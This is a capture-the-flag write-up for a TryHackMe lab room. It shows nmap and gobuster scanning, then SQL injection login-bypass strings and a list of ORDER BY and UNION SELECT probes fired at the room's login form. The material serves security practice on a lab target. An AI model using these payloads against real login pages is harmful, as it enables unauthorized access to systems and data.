# Lesson Learned?

**Room Link:** [https://tryhackme.com/room/lessonlearned](https://tryhackme.com/room/lessonlearned)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





**Browser**

<figure><img src="../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

```
Username: 1' or '1'='1'-- -
Password: 1' or '1'='1'-- -
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Option #1&#x20;

Used this page to collect possible injections

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection" %}

**List**

```
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
1' GROUP BY 1--+
1' GROUP BY 2--+
1' GROUP BY 3--+
1' GROUP BY 4--+
1' UNION SELECT null-- -
1' UNION SELECT null,null-- -
1' UNION SELECT null,null,null-- -
```

<figure><img src="../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>



Add list above as payload in position 1 and 2

<figure><img src="../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

**Browser**

```
Username: 1' UNION SELECT null-- -
Password: 1' GROUP BY 2--+
```



<figure><img src="../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>









